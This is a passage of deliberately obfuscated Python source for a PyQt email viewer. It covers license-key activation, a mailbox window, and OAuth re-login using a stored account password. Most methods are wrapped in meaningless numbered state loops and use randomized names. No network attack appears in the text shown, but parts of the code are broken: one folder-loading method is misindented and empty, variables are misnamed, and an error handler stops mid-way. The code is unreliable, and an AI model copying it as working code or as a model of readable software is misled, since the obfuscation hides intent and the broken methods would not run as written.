            elif state4 == 461066:
                state4 = 150475
            elif state4 == 150475:
                if saved_key:
                    self.key_entry.setText(saved_key)
                    self._activate(is_saved=True)
                state4 = -1
            else:
                break

    def _activate(self, is_saved=False):
        state = 821332
        while True:
            if state == 821332:
                key = self.key_entry.text().strip()
                state = 974856
            elif state == 974856:
                if not key:
                    self._set_status('Please enter a license key', Colors.WARNING)
                    return
                state = 793008
            elif state == 793008:
                self.activate_btn.setEnabled(False)
                state = 890505
            elif state == 890505:
                self.key_entry.setEnabled(False)
                state = 896471
            elif state == 896471:
                self.activate_btn.setText('Validating…')
                state = 390016
            elif state == 390016:
                self._set_status('Verifying license with server…', Colors.TEXT_SOFT)
                state = 821660
            elif state == 821660:
                self._worker = LicenseWorker(key)
                state = 91853
            elif state == 91853:
                self._worker.result.connect(lambda ok, err: self._on_result(ok, err, key))
                state = 516570
            elif state == 516570:
                self._worker.start()
                state = -1
            else:
                break

    def _on_result(self, ok, err, key):
        state = 721842
        while True:
            if state == 721842:
                self._worker = None
                state = 117393
            elif state == 117393:
                self.activate_btn.setEnabled(True)
                state = 443847
            elif state == 443847:
                self.key_entry.setEnabled(True)
                state = 228025
            elif state == 228025:
                self.activate_btn.setText('Activate License')
                state = 639293
            elif state == 639293:
                if ok:
                    save_key(key)
                    self._set_status('✓ License activated successfully', Colors.SUCCESS)
                    QTimer.singleShot(500, lambda: (self.success.emit(key), self.accept()))
                else:
                    _7e_77572e = err and (not any((proxy in err.lower() for proxy in ('network', 'timeout', 'rate limit', 'no internet', 'connection'))))
                    if _7e_77572e:
                        delete_key()
                        self._set_status(f'✗ {err}', Colors.DANGER)
                    else:
                        saved_key = get_cached_key()
                        if saved_key and saved_key == key:
                            self._set_status('⚠ Offline mode (cached key)', Colors.WARNING)
                            QTimer.singleShot(700, lambda: (self.success.emit(key), self.accept()))
                        else:
                            self._set_status(f"⚠ {err or 'Network error — try again'}", Colors.WARNING)
                state = -1
            else:
                break

    def _set_status(self, html_msg, color):
        state4 = 406146
        while True:
            if state4 == 406146:
                state4 = 908304
            elif state4 == 908304:
                self.status_lbl.setText(html_msg)
                state4 = 1006784
            elif state4 == 1006784:
                self.status_lbl.setStyleSheet(f'color: {color}; font-size: {Colors.FS_BODY}px; background: transparent;')
                state4 = -1
            else:
                break

class SessionsWindow(QMainWindow):
    closed = pyqtSignal(str)

    def __init__(self, account, search_keywords=None, parent=None):
        state = 843378
        while True:
            if state == 843378:
                super().__init__(parent)
                state = 303734
            elif state == 303734:
                self.account = account
                state = 518388
            elif state == 518388:
                self._init_search = search_keywords or ''
                state = 176447
            elif state == 176447:
                self.setWindowTitle(f"{account['email']}  —  Email Viewer")
                state = 453819
            elif state == 453819:
                self.resize(1380, 880)
                state = 943742
            elif state == 943742:
                self.setMinimumSize(980, 640)
                state = 630388
            elif state == 630388:
                self.setWindowIcon(make_icon(32))
                state = 355442
            elif state == 355442:
                self.folders = []
                state = 466135
            elif state == 466135:
                self.cur_folder = 'INBOX'
                state = 175849
            elif state == 175849:
                self.messages = []
                state = 1016455
            elif state == 1016455:
                self.cur_uid = None
                state = 177148
            elif state == 177148:
                self.total = 0
                state = 160477
            elif state == 160477:
                self._fetch_cache = {}
                state = 655374
            elif state == 655374:
                self._workers = []
                state = 257888
            elif state == 257888:
                self._compose_dialog = None
                state = 630793
            elif state == 630793:
                self._loading_folders = False
                state = 819092
            elif state == 819092:
                self._last_html_raw = ''
                state = 213481
            elif state == 213481:
                self._is_closing = False
                state = 170270
            elif state == 170270:
                self._fresh_token = None
                state = 933878
            elif state == 933878:
                self._fresh_cid = None
                state = 502837
            elif state == 502837:
                self._token_loading = False
                state = 94567
            elif state == 94567:
                self._build()
                state = 206525
            elif state == 206525:
                self._bind_shortcuts()
                state = 877807
            elif state == 877807:
                self._show_empty_states()
                state = 474595
            elif state == 474595:
                QTimer.singleShot(100, self._load_folders)
                state = -1
            else:
                break

    def _init_with_fresh_token(self):
        pass
        if self._is_closing:
            return
        if self._token_loading:
            return
        self._token_loading = True
        self._setstatus('Authenticating…', Colors.INFO)

        class _1ab_10df43(QThread):
            done = pyqtSignal(str, str)
            err = pyqtSignal(str)

            def __init__(self, email, pw):
                state = 316642
                while True:
                    if state == 316642:
                        super().__init__()
                        state = 850187
                    elif state == 850187:
                        self.email = email
                        state = 701934
                    elif state == 701934:
                        self.pw = pw
                        state = -1
                    else:
                        break

            def run(self):
                for attempt in range(3):
                    token, cid, err = oauth_login(self.email, self.pw)
                    if token:
                        self.done.emit(token, cid)
                        return
                    if attempt < 2:
                        time.sleep(0.5)
                self.err.emit(err or 'Re-auth failed after 3 attempts')
        email = self.account['email']
        pw = self.account.get('pw', '') or self.account.get('password', '')
        if not pw:
            self._setstatus('No password for authentication', Colors.DANGER)
            return
        worker = _1ab_10df43(email, pw)
        worker.done.connect(self._on_fresh_token)
        worker.err.connect(self._on_auth_error)
        self._workers.append(worker)
        worker.start()

    def _on_fresh_token(self, token, cid):
        state = 435398
        while True:
            if state == 435398:
                pass
                state = 702346
            elif state == 702346:
                if self._is_closing:
                    return
                state = 481300
            elif state == 481300:
                self._fresh_token = token
                state = 568650
            elif state == 568650:
                self._fresh_cid = cid
                state = 640931
            elif state == 640931:
                self._token_loading = False
                state = 247777
            elif state == 247777:
                if 'info' in self.account:
                    self.account['info']['token'] = token
                    self.account['info']['cid'] = cid
                state = 631061
            elif state == 631061:
                self._setstatus('Loading folders…', Colors.INFO)
                state = 753138
            elif state == 753138:
                self._load_folders()
                state = -1
            else:
                break

    def _on_auth_error(self, err):
        state = 1017409
        while True:
            if state == 1017409:
                pass
                state = 384743
            elif state == 384743:
                if self._is_closing:
                    return
                state = 255603
            elif state == 255603:
                self._token_loading = False
                state = 936496
            elif state == 936496:
                self._setstatus(f'Auth failed: {err[:60]}', Colors.DANGER)
                state = -1
            else:
                break

    def _prefill_search(self):
        state = 327985
        while True:
            if state == 327985:
                pass
                state = 990411
            elif state == 990411:
                if self._is_closing:
                    return
                state = 439849
            elif state == 439849:
                if self._init_search:
                    self.search_entry.setText(self._init_search)
                    self._setstatus(f'Search pre-filled with keyword — press Enter to search', Colors.INFO)
                state = -1
            else:
                break

    def _show_empty_states(self):
        state = 178608
        while True:
            if state == 178608:
                self.folder_list.clear()
                state = 1014531
            elif state == 1014531:
                loading_item = QListWidgetItem('  Loading folders…')
                state = 1029498
            elif state == 1029498:
                loading_item.setFlags(Qt.ItemFlag.NoItemFlags)
                state = 650815
            elif state == 650815:
                loading_item.setForeground(QColor(Colors.TEXT_MUTED))
                state = 884263
            elif state == 884263:
                self.folder_list.addItem(loading_item)
                state = 838513
            elif state == 838513:
                self._show_body_empty_state()
                state = -1
            else:
                break

    def _show_body_empty_state(self):
        state = 590290
        while True:
            if state == 590290:
                self.hdr_subj.setText('')
                state = 639473
            elif state == 639473:
                self.hdr_from.setText('')
                state = 668022
            elif state == 668022:
                self.hdr_date.setText('')
                state = 851335
            elif state == 851335:
                self.body_browser.setHtml(f"\n        <div style='text-align:center; padding:80px 20px; color:{Colors.TEXT_MUTED};'>\n            <div style='font-size:48px; margin-bottom:16px; opacity:0.3;'>✉</div>\n            <div style='font-size:14px; font-weight:600; color:{Colors.TEXT_SOFT}; margin-bottom:4px;'>No message selected</div>\n            <div style='font-size:12px; color:{Colors.TEXT_MUTED};'>Choose a message from the list to preview its contents</div>\n        </div>\n        ")
                state = -1
            else:
                break

    def _build(self):
        state = 471223
        while True:
            if state == 471223:
                widget = QWidget()
                state = 607812
            elif state == 607812:
                self.setCentralWidget(widget)
                state = 577308
            elif state == 577308:
                root = QVBoxLayout(widget)
                state = 207133
            elif state == 207133:
                root.setContentsMargins(0, 0, 0, 0)
                state = 571292
            elif state == 571292:
                root.setSpacing(0)
                state = 633072
            elif state == 633072:
                frame4 = QFrame()
                state = 1009427
            elif state == 1009427:
                frame4.setFixedHeight(56)
                state = 313065
            elif state == 313065:
                frame4.setStyleSheet(f'.QFrame {{ background: {Colors.BG_ELEVATED}; border-bottom: 1px solid {Colors.BORDER}; }}')
                state = 170972
            elif state == 170972:
                hbox2 = QHBoxLayout(frame4)
                state = 339209
            elif state == 339209:
                hbox2.setContentsMargins(Colors.SP_LG, Colors.SP_SM, Colors.SP_LG, Colors.SP_SM)
                state = 747089
            elif state == 747089:
                hbox2.setSpacing(Colors.SP_MD)
                state = 77382
            elif state == 77382:
                lbl2 = QLabel()
                state = 87687
            elif state == 87687:
                lbl2.setPixmap(make_icon_alt(28))
                state = 766855
            elif state == 766855:
                hbox2.addWidget(lbl2)
                state = 566056
            elif state == 566056:
                vbox3 = QVBoxLayout()
                state = 1023150
            elif state == 1023150:
                vbox3.setSpacing(0)
                state = 498367
            elif state == 498367:
                title = QLabel('Mail')
                state = 784822
            elif state == 784822:
                title.setStyleSheet(f'font-size: {Colors.FS_LG}px; font-weight: {Colors.FW_BOLD}; color: {Colors.TEXT};')
                state = 442021
            elif state == 442021:
                vbox3.addWidget(title)
                state = 960615
            elif state == 960615:
                sub = QLabel(self.account['email'])
                state = 375802
            elif state == 375802:
                sub.setStyleSheet(f'font-size: {Colors.FS_CAPTION}px; color: {Colors.TEXT_MUTED}; letter-spacing: 0.5px;')
                state = 125260
            elif state == 125260:
                vbox3.addWidget(sub)
                state = 260735
            elif state == 260735:
                hbox2.addLayout(vbox3)
                state = 526540
            elif state == 526540:
                hbox2.addSpacing(Colors.SP_LG)
                state = 172219
            elif state == 172219:
                frame = QFrame()
                state = 331255
            elif state == 331255:
                frame.setFixedWidth(1)
                state = 971599
            elif state == 971599:
                frame.setStyleSheet(f'background: {Colors.BORDER};')
                state = 782361
            elif state == 782361:
                frame.setFixedHeight(28)
                state = 329383
            elif state == 329383:
                hbox2.addWidget(frame)
                state = 480870
            elif state == 480870:
                hbox2.addSpacing(Colors.SP_SM)
                state = 774631
            elif state == 774631:
                frame5 = QFrame()
                state = 200352
            elif state == 200352:
                frame5.setStyleSheet(f'.QFrame {{ background: {Colors.BG}; border: 1px solid {Colors.BORDER}; border-radius: {Colors.R_PILL}px; }}')
                state = 488024
            elif state == 488024:
                frame5.setMinimumWidth(320)
                state = 666382
            elif state == 666382:
                sh = QHBoxLayout(frame5)
                state = 824866
            elif state == 824866:
                sh.setContentsMargins(Colors.SP_MD, 0, 0, 0)
                state = 145995
            elif state == 145995:
                sh.setSpacing(Colors.SP_SM)
                state = 823788
            elif state == 823788:
                lbl14 = QLabel()
                state = 615657
            elif state == 615657:
                lbl14.setPixmap(SettingsDialog.search(14, Colors.TEXT_MUTED))
                state = 648987
            elif state == 648987:
                sh.addWidget(lbl14)
                state = 842934
            elif state == 842934:
                self.search_entry = QLineEdit()
                state = 988994
            elif state == 988994:
                self.search_entry.setPlaceholderText('Search messages…')
                state = 734348
            elif state == 734348:
                self.search_entry.setStyleSheet('background: transparent; border: none; padding: 8px 4px;')
                state = 779639
            elif state == 779639:
                self.search_entry.returnPressed.connect(self._refresh_folder)
                state = 237418
            elif state == 237418:
                sh.addWidget(self.search_entry)
                state = 686544
            elif state == 686544:
                hbox2.addWidget(frame5, 1)
                state = 383961
            elif state == 383961:
                btn3 = QPushButton()
                state = 736486
            elif state == 736486:
                btn3.setIcon(make_icon_from_name('refresh', 16, Colors.TEXT_SOFT))
                state = 868395
            elif state == 868395:
                btn3.setObjectName('Ghost')
                state = 461654
            elif state == 461654:
                btn3.setFixedSize(36, 36)
                state = 812338
            elif state == 812338:
                btn3.setCursor(Qt.CursorShape.PointingHandCursor)
                state = 968100
            elif state == 968100:
                btn3.clicked.connect(lambda: self._refresh_folder())
                state = 721362
            elif state == 721362:
                Theme(btn3, 'Refresh folder (Ctrl+R)')
                state = 531161
            elif state == 531161:
                hbox2.addWidget(btn3)
                state = 401211
            elif state == 401211:
                compose_btn = QPushButton('  Compose  ')
                state = 807998
            elif state == 807998:
                compose_btn.setObjectName('Primary')
                state = 183931
            elif state == 183931:
                compose_btn.setIcon(make_icon_from_name('send', 14, Colors.BG))
                state = 583124
            elif state == 583124:
                compose_btn.setCursor(Qt.CursorShape.PointingHandCursor)
                state = 468333
            elif state == 468333:
                compose_btn.clicked.connect(lambda: self._compose())
                state = 204494
            elif state == 204494:
                Theme(compose_btn, 'Compose new message (Ctrl+N)')
                state = 899177
            elif state == 899177:
                hbox2.addWidget(compose_btn)
                state = 717385
            elif state == 717385:
                root.addWidget(frame4)
                state = 334924
            elif state == 334924:
                splitter = QSplitter(Qt.Orientation.Horizontal)
                state = 644140
            elif state == 644140:
                splitter.setChildrenCollapsible(False)
                state = 211332
            elif state == 211332:
                splitter.setHandleWidth(1)
                state = 970014
            elif state == 970014:
                splitter.setStyleSheet(f'QSplitter {{ background: {Colors.BORDER}; }}')
                state = 492113
            elif state == 492113:
                folders_pane = self._build_folders_pane()
                state = 613717
            elif state == 613717:
                splitter.addWidget(folders_pane)
                state = 983269
            elif state == 983269:
                _c1_e8a235 = self._build_msglist_pane()
                state = 265678
            elif state == 265678:
                splitter.addWidget(_c1_e8a235)
                state = 992073
            elif state == 992073:
                _1bc_d565a5 = self._build_viewer_pane()
                state = 219317
            elif state == 219317:
                splitter.addWidget(_1bc_d565a5)
                state = 323979
            elif state == 323979:
                splitter.setStretchFactor(0, 0)
                state = 83333
            elif state == 83333:
                splitter.setStretchFactor(1, 1)
                state = 531600
            elif state == 531600:
                splitter.setStretchFactor(2, 2)
                state = 149454
            elif state == 149454:
                splitter.setSizes([220, 420, 740])
                state = 629295
            elif state == 629295:
                root.addWidget(splitter, 1)
                state = -1
            else:
                break

    def _build_folders_pane(self):
        state = 102994
        while True:
            if state == 102994:
                worker = QWidget()
                state = 319644
            elif state == 319644:
                worker.setMinimumWidth(180)
                state = 973777
            elif state == 973777:
                worker.setMaximumWidth(280)
                state = 136103
            elif state == 136103:
                worker.setStyleSheet(f'.QWidget {{ background: {Colors.BG_ELEVATED}; }}')
                state = 573707
            elif state == 573707:
                item = QVBoxLayout(worker)
                state = 1039904
            elif state == 1039904:
                item.setContentsMargins(Colors.SP_MD, Colors.SP_LG, Colors.SP_MD, Colors.SP_MD)
                state = 273648
            elif state == 273648:
                item.setSpacing(Colors.SP_SM)
                state = 939665
            elif state == 939665:
                hbox = QHBoxLayout()
                state = 469190
            elif state == 469190:
                lbl3 = QLabel('Folders')
                state = 696535
            elif state == 696535:
                lbl3.setObjectName('Caption')
                state = 396615
            elif state == 396615:
                hbox.addWidget(lbl3)
                state = 334175
            elif state == 334175:
                hbox.addStretch(1)
                state = 992226
            elif state == 992226:
                item.addLayout(hbox)
                state = 845179
            elif state == 845179:
                self.folder_list = QListWidget()
                state = 974423
            elif state == 974423:
                self.folder_list.setStyleSheet(f'\n            QListWidget {{ background: transparent; border: none; font-size: {Colors.FS_BODY}px; padding: 0; }}\n            QListWidget::item {{ padding: 8px 10px; border: none; border-radius: {Colors.R_SM}px; margin: 1px 0; }}\n            QListWidget::item:hover {{ background: {Colors.SURFACE}; }}\n            QListWidget::item:selected {{ background: {Colors.SURFACE_2}; color: {Colors.ACCENT}; border-left: 2px solid {Colors.ACCENT}; }}\n        ')
                state = 199846
            elif state == 199846:
                self.folder_list.itemClicked.connect(self._on_folder_select)
                state = 729354
            elif state == 729354:
                item.addWidget(self.folder_list)
                state = 940375
            elif state == 940375:
                return worker
            else:
                break

    def _build_msglist_pane(self):
        state = 874236
        while True:
            if state == 874236:
                worker = QWidget()
                state = 858190
            elif state == 858190:
                worker.setMinimumWidth(320)
                state = 483091
            elif state == 483091:
                worker.setStyleSheet(f'.QWidget {{ background: {Colors.BG_ELEVATED}; border-left: 1px solid {Colors.BORDER}; border-right: 1px solid {Colors.BORDER}; }}')
                state = 421880
            elif state == 421880:
                item = QVBoxLayout(worker)
                state = 366442
            elif state == 366442:
                item.setContentsMargins(0, Colors.SP_LG, 0, Colors.SP_MD)
                state = 1025481
            elif state == 1025481:
                item.setSpacing(Colors.SP_SM)
                state = 1042815
            elif state == 1042815:
                hbox = QHBoxLayout()
                state = 996313
            elif state == 996313:
                hbox.setContentsMargins(Colors.SP_MD, 0, Colors.SP_MD, 0)
                state = 438670
            elif state == 438670:
                lbl3 = QLabel('Messages')
                state = 869357
            elif state == 869357:
                lbl3.setObjectName('Caption')
                state = 430284
            elif state == 430284:
                hbox.addWidget(lbl3)
                state = 514739
            elif state == 514739:
                hbox.addStretch(1)
                state = 372025
            elif state == 372025:
                self.count_lbl = QLabel('0')
                state = 773710
            elif state == 773710:
                self.count_lbl.setStyleSheet(f'color: {Colors.TEXT_MUTED}; font-family: {Colors.FONT_MONO}; font-size: {Colors.FS_CAPTION}px;')
                state = 551025
            elif state == 551025:
                hbox.addWidget(self.count_lbl)
                state = 79890
            elif state == 79890:
                item.addLayout(hbox)
                state = 537436
            elif state == 537436:
                self.folder_subtitle = QLabel('INBOX')
                state = 796222
            elif state == 796222:
                self.folder_subtitle.setStyleSheet(f'color: {Colors.TEXT_SOFT}; font-size: {Colors.FS_SMALL}px; font-weight: {Colors.FW_MEDIUM}; padding: 0 {Colors.SP_MD}px;')
                state = 346047
            elif state == 346047:
                item.addWidget(self.folder_subtitle)
                state = 603802
            elif state == 603802:
                item.addSpacing(Colors.SP_XS)
                state = 252478
            elif state == 252478:
                self.msg_list = QListWidget()
                state = 723419
            elif state == 723419:
                self.msg_list.setSelectionMode(QAbstractItemView.SelectionMode.ExtendedSelection)
                state = 424806
            elif state == 424806:
                self.msg_list.setStyleSheet(f'\n            QListWidget {{ background: transparent; border: none; font-size: {Colors.FS_BODY}px; padding: 0; }}\n            QListWidget::item {{ padding: 10px 12px; border: none; border-bottom: 1px solid {Colors.BORDER}; border-radius: 0; }}\n            QListWidget::item:hover {{ background: {Colors.SURFACE}; }}\n            QListWidget::item:selected {{ background: {Colors.SURFACE_2}; color: {Colors.TEXT}; border-left: 2px solid {Colors.ACCENT}; }}\n        ')
                state = 555936
            elif state == 555936:
                self.msg_list.itemClicked.connect(self._on_msg_select)
                state = 106790
            elif state == 106790:
                self.msg_list.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
                state = 617060
            elif state == 617060:
                self.msg_list.customContextMenuRequested.connect(self._msg_context_menu)
                state = 634372
            elif state == 634372:
                item.addWidget(self.msg_list, 1)
                state = 148507
            elif state == 148507:
                self.msg_empty = QLabel('No messages')
                state = 217293
            elif state == 217293:
                self.msg_empty.setAlignment(Qt.AlignmentFlag.AlignCenter)
                state = 93633
            elif state == 93633:
                self.msg_empty.setStyleSheet(f'color: {Colors.TEXT_MUTED}; font-size: {Colors.FS_SMALL}px; padding: 40px;')
                state = 169247
            elif state == 169247:
                self.msg_empty.setVisible(False)
                state = 838393
            elif state == 838393:
                item.addWidget(self.msg_empty)
                state = 638138
            elif state == 638138:
                return worker
            else:
                break

    def _build_viewer_pane(self):
        worker = QWidget()
        worker.setMinimumWidth(400)
        worker.setStyleSheet(f'.QWidget {{ background: {Colors.BG}; }}')
        item = QVBoxLayout(worker)
        item.setContentsMargins(0, 0, 0, 0)
        item.setSpacing(0)
        frame6 = QFrame()
        frame6.setFixedHeight(44)
        frame6.setStyleSheet(f'.QFrame {{ background: {Colors.BG_ELEVATED}; border-bottom: 1px solid {Colors.BORDER}; }}')
        hbox3 = QHBoxLayout(frame6)
        hbox3.setContentsMargins(Colors.SP_MD, 0, Colors.SP_MD, 0)
        hbox3.setSpacing(2)

        def make_action_btn(icon_name, label, handler, color=None):
            state = 938934
            while True:
                if state == 938934:
                    btn = QPushButton()
                    state = 922823
                elif state == 922823:
                    btn.setIcon(make_icon_from_name(icon_name, 16, color or Colors.TEXT_SOFT))
                    state = 761747
                elif state == 761747:
                    btn.setObjectName('Icon')
                    state = 393831
                elif state == 393831:
                    btn.setFixedSize(34, 34)
                    state = 339371
                elif state == 339371:
                    btn.setCursor(Qt.CursorShape.PointingHandCursor)
                    state = 344679
                elif state == 344679:
                    btn.clicked.connect(lambda checked=False, key_hash=handler: key_hash())
                    state = 212008
                elif state == 212008:
                    Theme(btn, label)
                    state = 569584
                elif state == 569584:
                    return btn
                else:
                    break
        self.btn_reply = make_action_btn('reply', 'Reply', self._reply)
        hbox3.addWidget(self.btn_reply)
        self.btn_forward = make_action_btn('forward', 'Forward', self._forward)
        hbox3.addWidget(self.btn_forward)
        self.btn_delete = make_action_btn('trash', 'Delete', self._delete, Colors.DANGER)
        hbox3.addWidget(self.btn_delete)
        hbox3.addSpacing(Colors.SP_SM)
        frame = QFrame()
        frame.setFixedWidth(1)
        frame.setFixedHeight(20)
        frame.setStyleSheet(f'background: {Colors.BORDER};')
        hbox3.addWidget(frame)
        hbox3.addSpacing(Colors.SP_SM)
        self.btn_save = make_action_btn('save', 'Save as .eml', self._save_eml)
        hbox3.addWidget(self.btn_save)
        self.btn_html = make_action_btn('code', 'Toggle HTML view', self._toggle_html)
        self.btn_html.setCheckable(True)
        hbox3.addWidget(self.btn_html)
        self.btn_copy = make_action_btn('copy', 'Copy body', self._copy_body)
        hbox3.addWidget(self.btn_copy)
        self.btn_browser = QPushButton('  Open in Browser  ')
        self.btn_browser.setObjectName('Ghost')
        self.btn_browser.setIcon(make_icon_from_name('link', 14, Colors.ACCENT))
        self.btn_browser.setCursor(Qt.CursorShape.PointingHandCursor)
        self.btn_browser.clicked.connect(lambda: self._open_in_browser())
        Theme(self.btn_browser, 'Open email in your default web browser')
        hbox3.addWidget(self.btn_browser)
        hbox3.addStretch(1)
        self.status_dot = QLabel('●')
        self.status_dot.setStyleSheet(f'color: {Colors.TEXT_MUTED}; font-size: {Colors.FS_SMALL}px;')
        hbox3.addWidget(self.status_dot)
        self.status_lbl = QLabel('Ready')
        self.status_lbl.setStyleSheet(f'color: {Colors.TEXT_MUTED}; font-size: {Colors.FS_CAPTION}px; padding-right: {Colors.SP_MD}px; background: transparent;')
        hbox3.addWidget(self.status_lbl)
        item.addWidget(frame6)
        widget2 = QWidget()
        widget2.setStyleSheet(f'.QWidget {{ background: {Colors.BG_ELEVATED}; border-bottom: 1px solid {Colors.BORDER}; }}')
        vbox2 = QVBoxLayout(widget2)
        vbox2.setContentsMargins(Colors.SP_LG, Colors.SP_MD, Colors.SP_LG, Colors.SP_MD)
        vbox2.setSpacing(2)
        self.hdr_subj = QLabel('')
        self.hdr_subj.setStyleSheet(f'font-size: {Colors.FS_LG}px; font-weight: {Colors.FW_BOLD}; color: {Colors.TEXT}; background: transparent;')
        self.hdr_subj.setWordWrap(True)
        vbox2.addWidget(self.hdr_subj)
        self.hdr_from = QLabel('')
        self.hdr_from.setStyleSheet(f'font-size: {Colors.FS_BODY}px; color: {Colors.TEXT_SOFT}; background: transparent;')
        self.hdr_from.setWordWrap(True)
        vbox2.addWidget(self.hdr_from)
        self.hdr_date = QLabel('')
        self.hdr_date.setStyleSheet(f'font-size: {Colors.FS_CAPTION}px; color: {Colors.TEXT_MUTED}; background: transparent;')
        vbox2.addWidget(self.hdr_date)
        item.addWidget(widget2)
        self.body_browser = QTextBrowser()
        self.body_browser.setOpenExternalLinks(True)
        item.addWidget(self.body_browser, 1)
        return worker

    def _bind_shortcuts(self):
        state = 394993
        while True:
            if state == 394993:
                QShortcut(QKeySequence('Ctrl+R'), self, activated=self._refresh_folder)
                state = 916128
            elif state == 916128:
                QShortcut(QKeySequence('Ctrl+N'), self, activated=self._compose)
                state = 595588
            elif state == 595588:
                QShortcut(QKeySequence('Delete'), self, activated=self._delete)
                state = 77591
            elif state == 77591:
                QShortcut(QKeySequence('Ctrl+A'), self, activated=self._select_all)
                state = 216728
            elif state == 216728:
                QShortcut(QKeySequence('Ctrl+F'), self, activated=lambda: self.search_entry.setFocus())
                state = 376146
            elif state == 376146:
                QShortcut(QKeySequence('Escape'), self, activated=self.close)
                state = 90291
            elif state == 90291:
                QShortcut(QKeySequence('Ctrl+Q'), self, activated=self.close)
                state = -1
            else:
                break

    def _setstatus(self, html_msg, color=None):
        state = 574149
        while True:
            if state == 574149:
                client = color or Colors.TEXT_MUTED
                state = 376962
            elif state == 376962:
                self.status_lbl.setText(html_msg)
                state = 914797
            elif state == 914797:
                self.status_lbl.setStyleSheet(f'color: {client}; font-size: {Colors.FS_CAPTION}px; padding-right: {Colors.SP_MD}px; background: transparent;')
                state = 128492
            elif state == 128492:
                self.status_dot.setStyleSheet(f'color: {client}; font-size: {Colors.FS_SMALL}px;')
                state = -1
            else:
                break

    def _load_folders(self):
                if self._is_closing:
                    return
    def _populate_folders(self, folders):
        if self._is_closing:
            return
        self._loading_folders = False
        self.folders = folders or ['INBOX']
        self.folder_list.clear()
        for folder in self.folders:
            msg = QListWidgetItem(folder)
            msg.setIcon(make_icon_from_name('folder', 14, Colors.TEXT_MUTED))
            if folder == self.cur_folder:
                self.folder_list.setCurrentItem(msg)
            self.folder_list.addItem(msg)
        self._setstatus(f'{len(self.folders)} folders', Colors.SUCCESS)
        if not self.messages:
            self._load_messages(self.cur_folder)

    def _on_folder_select(self, msg):
        state = 513072
        while True:
            if state == 513072:
                folder = msg.text()
                state = 526193
            elif state == 526193:
                if folder == self.cur_folder:
                    return
                state = 1034982
            elif state == 1034982:
                self.cur_folder = folder
                state = 981494
            elif state == 981494:
                self.folder_subtitle.setText(folder)
                state = 1011857
            elif state == 1011857:
                self._load_messages(folder)
                state = -1
            else:
                break

    def _load_messages(self, folder):
        state = 477703
        while True:
            if state == 477703:
                if self._is_closing:
                    return
                state = 312883
            elif state == 312883:
                self.cur_folder = folder
                state = 240937
            elif state == 240937:
                self.folder_subtitle.setText(folder)
                state = 881866
            elif state == 881866:
                self._setstatus(f'Loading {folder}…', Colors.INFO)
                state = 622933
            elif state == 622933:
                self.msg_list.clear()
                state = 1010619
            elif state == 1010619:
                self.messages = []
                state = 307534
            elif state == 307534:
                self.count_lbl.setText('0')
                state = 781712
            elif state == 781712:
                self.msg_empty.setVisible(True)
                state = 403747
            elif state == 403747:
                self.msg_empty.setText('Loading…')
                state = 683151
            elif state == 683151:
                search_q = self.search_entry.text().strip() or None
                state = 648238
            elif state == 648238:
                worker = Worker2(self.account, folder, limit=50, search_q=search_q)
                state = 144845
            elif state == 144845:
                worker.done.connect(self._populate_messages)
                state = 747981
            elif state == 747981:
                worker.err.connect(self._on_load_error)
                state = 756566
            elif state == 756566:
                self._workers.append(worker)
                state = 110736
            elif state == 110736:
                worker.start()
                state = -1
            else:
                break

    def _populate_messages(self, extra, total, folder):
        if self._is_closing:
            return
        if folder != self.cur_folder:
            return
        self.messages = extra or []
        self.total = total
        self.msg_list.clear()
        for kw in self.messages:
            subject = kw.get('subject', '(no subject)')
            from_addr = kw.get('from', '')
            if isinstance(from_addr, dict):
                from_name = from_addr.get('EmailAddress', {}).get('Name', '') if isinstance(from_addr.get('EmailAddress'), dict) else ''
                from_email = from_addr.get('EmailAddress', {}).get('Address', '') if isinstance(from_addr.get('EmailAddress'), dict) else ''
                from_mailbox = f'{from_name} <{from_email}>' if from_email else from_name
            elif from_addr is None:
                from_mailbox = ''
            else:
                from_mailbox = str(from_addr)
            val3 = kw.get('date', '')
            short = str(val3)[:22] if val3 else ''
            read = kw.get('read', False)
            weight = QFont.Weight.Normal if read else QFont.Weight.Bold
            text = f'{subject[:80]}\n{from_mailbox[:60]}  ·  {short}'
            msg = QListWidgetItem(text)
            folder = msg.font()
            folder.setWeight(weight)
            msg.setFont(folder)
            if not read:
                msg.setForeground(QColor(Colors.TEXT))
                msg.setIcon(make_icon_from_name('mail', 12, Colors.ACCENT))
            else:
                msg.setForeground(QColor(Colors.TEXT_SOFT))
                msg.setIcon(make_icon_from_name('mail_open', 12, Colors.TEXT_MUTED))
            self.msg_list.addItem(msg)
        self.count_lbl.setText(str(len(self.messages)))
        if not self.messages:
            self.msg_empty.setVisible(True)
            self.msg_empty.setText(f'No messages in {folder}')
        else:
            self.msg_empty.setVisible(False)
        self._setstatus(f'{len(self.messages)} of {total}', Colors.SUCCESS)

    def _refresh_folder(self):
        self._fetch_cache.clear()
        self._load_messages(self.cur_folder)

    def _on_load_error(self, err, *_108_e23d4a):
        state = 183726
        while True:
            if state == 183726:
                if self._is_closing:
                    return
                state = 89708
            elif state == 89708:
                self._loading_folders = False
                state = 950296
            elif state == 950296:
                err_lower = str(err).lower()
                state = 946055
            elif state == 946055:
                if 'invalid characters' in err_lower or ('select' in err_lower and 'bad' in err_lower):
                    title = 'Folder Name Error'
                    err_msg = 'The mail server rejected the folder name due to special characters. This is now fixed — please click Refresh.'
                    color = Colors.WARNING
                elif 'timeout' in err_lower or 'timed out' in err_lower:
                    title = 'Connection Timed Out'
                    err_msg = 'The mail server is taking too long to respond. It may be slow or overloaded. Try again in a moment.'
                    color = Colors.WARNING
                elif 'refused' in err_lower:
                    title = 'Connection Refused'
                    err_msg = 'The mail server refused the connection. It may be down or blocking access. Try again later.'
                    color = Colors.WARNING
                elif 'rate' in err_lower or 'limit' in err_lower or 'too many' in err_lower:
                    title = 'Rate Limited'
                    err_msg = 'The mail server is rate-limiting connections. Wait 1-2 minutes before trying again.'
                    color = Colors.WARNING
                elif 'auth' in err_lower or 'login' in err_lower or 'password' in err_lower or ('credential' in err_lower):
                    title = 'Authentication Failed'
                    err_msg = 'The email credentials are incorrect or the account may be locked.'
                    color = Colors.DANGER
                elif 'circuit breaker' in err_lower:
                    title = 'Too Many Failures'
                    err_msg = 'This server has failed multiple times. Wait a moment before trying again.'
                    color = Colors.WARNING
                else:
                    title = 'Connection Error'
                    err_msg = 'The IMAP server may be unreachable, rate-limiting, or your credentials may be incorrect. The app will auto-retry on transient errors.'
                    color = Colors.WARNING
                state = 976499
            elif state == 976499:
                self._setstatus(f'Error: {err[:80]}', Colors.DANGER)
                state = 425651
            elif state == 425651:
                self.msg_empty.setVisible(True)
                state = 1030626
            elif state == 1030626:
